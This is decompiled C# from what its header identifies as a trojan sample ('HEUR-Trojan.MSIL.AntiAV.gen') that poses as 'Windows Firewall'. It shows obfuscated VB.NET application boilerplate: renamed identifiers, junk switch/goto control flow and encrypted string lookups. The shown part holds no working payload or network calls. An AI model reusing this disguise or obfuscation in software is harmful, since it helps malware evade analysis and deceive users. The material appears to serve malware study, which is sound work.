// Decompiled with JetBrains decompiler
// Type: WindowsFirewall.ActivityContext
// Assembly: Windows Firewall, Version=12.5.2.3, Culture=neutral, PublicKeyToken=null
// MVID: B2F50818-876B-4F01-AE88-291FA22C03A1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan.MSIL.AntiAV.gen-0a7f9a4a2ff6257feb79223e3432cef859eda0b8e5738450449fd016eb059f70.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Windows_Firewall;

namespace WindowsFirewall
{
  [HideModuleName]
  [StandardModule]
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  internal sealed class ActivityContext
  {
    private static readonly ActivityContext.OutlineSite<MenuItemList> currentColor = new ActivityContext.OutlineSite<MenuItemList>();
    private static readonly ActivityContext.OutlineSite<DomainEventArgs> currentColor = new ActivityContext.OutlineSite<DomainEventArgs>();
    private static readonly ActivityContext.OutlineSite<User> currentColor = new ActivityContext.OutlineSite<User>();
    private static ActivityContext.OutlineSite<ActivityContext.OptionsResolver> currentColor = new ActivityContext.OutlineSite<ActivityContext.OptionsResolver>();
    private static readonly ActivityContext.OutlineSite<ActivityContext.QueueHelper> currentColor = new ActivityContext.OutlineSite<ActivityContext.QueueHelper>();

    [DebuggerNonUserCode]
    static ActivityContext()
    {
    }

    [HelpKeyword("My.Computer")]
    internal static MenuItemList SelectToolbox
    {
      [DebuggerHidden] get => ActivityContext.currentColor.SelectToolbox;
    }

    [HelpKeyword("My.Application")]
    internal static DomainEventArgs SelectToolbox
    {
      [DebuggerHidden] get => ActivityContext.currentColor.SelectToolbox;
    }

    [HelpKeyword("My.User")]
    internal static User SelectToolbox
    {
      [DebuggerHidden] get => ActivityContext.currentColor.SelectToolbox;
    }

    [HelpKeyword("My.Forms")]
    internal static ActivityContext.OptionsResolver SelectToolbox
    {
      [DebuggerHidden] get => ActivityContext.currentColor.SelectToolbox;
    }

    [HelpKeyword("My.WebServices")]
    internal static ActivityContext.QueueHelper SelectToolbox
    {
      [DebuggerHidden] get => ActivityContext.currentColor.SelectToolbox;
    }

    [MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    internal sealed class OptionsResolver
    {
      public Form1 currentColor;
      [ThreadStatic]
      private static Hashtable currentColor;

      [EditorBrowsable(EditorBrowsableState.Never)]
      [DebuggerHidden]
      public OptionsResolver()
      {
      }

      public Form1 SelectToolbox
      {
        [DebuggerNonUserCode] get
        {
          this.currentColor = ActivityContext.OptionsResolver.SelectToolbox<Form1>(this.currentColor);
          return this.currentColor;
        }
        [DebuggerNonUserCode] set
        {
          if (value == this.currentColor)
          {
label_1:
            switch (3)
            {
              case 0:
                goto label_1;
              default:
                if (true)
                  break;
                RuntimeMethodHandle runtimeMethodHandle = __methodref (ActivityContext.OptionsResolver.set_SelectToolbox);
                break;
            }
          }
          else if (value != null)
          {
label_5:
            switch (1)
            {
              case 0:
                goto label_5;
              default:
                throw LineQueue.SelectToolbox(AspectDesigner.SelectToolbox(1));
            }
          }
          else
            this.SelectToolbox<Form1>(ref this.currentColor);
        }
      }

      [DebuggerHidden]
      private static currentColor SelectToolbox<currentColor>(currentColor currentColor) where currentColor : Form, new()
      {
        int num1;
        if ((object) currentColor != null)
        {
label_1:
          switch (3)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (ActivityContext.OptionsResolver.SelectToolbox);
              }
              if (!currentColor.IsDisposed)
              {
label_5:
                switch (5)
                {
                  case 0:
                    goto label_5;
                  default:
                    num1 = 0;
                    goto label_8;
                }
              }
              else
                break;
          }
        }
        num1 = 1;
label_8:
        if (num1 == 0)
          return currentColor;
label_9:
        switch (6)
        {
          case 0:
            goto label_9;
          default:
            if (ActivityContext.OptionsResolver.currentColor != null)
            {
label_11:
              switch (5)
              {
                case 0:
                  goto label_11;
                default:
                  // ISSUE: type reference
                  if (WindowList.SelectToolbox((object) ActivityContext.OptionsResolver.currentColor, (object) ResourceStream.SelectToolbox(__typeref (currentColor))))
                  {
label_13:
                    switch (3)
                    {
                      case 0:
                        goto label_13;
                      default:
                        throw EditorManager.SelectToolbox(FunctionSite.SelectToolbox(AspectDesigner.SelectToolbox(72), new string[0]));
                    }
                  }
                  else
                    break;
              }
            }
            else
              ActivityContext.OptionsResolver.currentColor = DialogSettings.SelectToolbox();
            // ISSUE: type reference
            StoreSettings.SelectToolbox((object) ActivityContext.OptionsResolver.currentColor, (object) ResourceStream.SelectToolbox(__typeref (currentColor)), (object) null);
            try
            {
              return new currentColor();
            }
            catch (TargetInvocationException ex) when (
            {
              // ISSUE: unable to correctly present filter
              VectorSettings.SelectToolbox((Exception) ex);
              int num2 = ResourceScope.SelectToolbox((object) ex) != null ? 1 : 0;
              if (num2 != 0)
              {
                SuccessfulFiltering;
              }
              else
                throw;
            }
            )
            {
              throw ConnectionEventArgs.SelectToolbox(FunctionSite.SelectToolbox(AspectDesigner.SelectToolbox(129), new string[1]
              {
                ImageResolver.SelectToolbox((object) ResourceScope.SelectToolbox((object) ex))
              }), ResourceScope.SelectToolbox((object) ex));
            }
            finally
            {
              // ISSUE: type reference
              FunctionStream.SelectToolbox((object) ActivityContext.OptionsResolver.currentColor, (object) ResourceStream.SelectToolbox(__typeref (currentColor)));
            }
        }
      }

      [DebuggerHidden]
      private void SelectToolbox<currentColor>(ref currentColor currentColor) where currentColor : Form
      {
        currentColor.Dispose();
        currentColor = default (currentColor);
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override bool Equals(object o) => DeploymentSettings.SelectToolbox((object) this, ProjectSet.SelectToolbox(o));

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override int GetHashCode() => GroupTree.SelectToolbox((object) this);

      [EditorBrowsable(EditorBrowsableState.Never)]
      internal System.Type SelectToolbox() => ResourceStream.SelectToolbox(__typeref (ActivityContext.OptionsResolver));

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override string ToString() => NetworkService.SelectToolbox((object) this);
    }

    [MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    internal sealed class QueueHelper
    {
      [EditorBrowsable(EditorBrowsableState.Never)]
      [DebuggerHidden]
      public QueueHelper()
      {
      }

      [DebuggerHidden]
      [EditorBrowsable(EditorBrowsableState.Never)]
      public override bool Equals(object o) => DeploymentSettings.SelectToolbox((object) this, ProjectSet.SelectToolbox(o));

      [DebuggerHidden]
      [EditorBrowsable(EditorBrowsableState.Never)]
      public override int GetHashCode() => GroupTree.SelectToolbox((object) this);

      [EditorBrowsable(EditorBrowsableState.Never)]
      [DebuggerHidden]
      internal System.Type SelectToolbox() => ResourceStream.SelectToolbox(__typeref (ActivityContext.QueueHelper));

      [EditorBrowsable(EditorBrowsableState.Never)]
      [DebuggerHidden]
      public override string ToString() => NetworkService.SelectToolbox((object) this);

      [DebuggerHidden]
      private static currentColor SelectToolbox<currentColor>(currentColor currentColor) where currentColor : new()
      {
        if ((object) currentColor != null)
          return currentColor;
label_1:
        switch (6)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ActivityContext.QueueHelper.SelectToolbox);
            }
            return new currentColor();
        }
      }

      [DebuggerHidden]
      private void SelectToolbox<currentColor>(ref currentColor currentColor) => currentColor = default (currentColor);
    }

    [ComVisible(false)]
    [EditorBrowsable(EditorBrowsableState.Never)]
    internal sealed class OutlineSite<currentColor> where currentColor : new()
    {
      [EditorBrowsable(EditorBrowsableState.Never)]
      [DebuggerHidden]
      public OutlineSite()
      {
      }

      internal currentColor SelectToolbox
      {
        [DebuggerHidden] get
        {
          if ((object) ActivityContext.OutlineSite<currentColor>.currentColor == null)
          {
label_1:
            switch (1)
            {
              case 0:
                goto label_1;
              default:
                if (false)
                {
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (ActivityContext.OutlineSite<>.get_SelectToolbox);
                }
                ActivityContext.OutlineSite<currentColor>.currentColor = new currentColor();
                break;
            }
          }
          return ActivityContext.OutlineSite<currentColor>.currentColor;
        }
      }
    }
  }
}
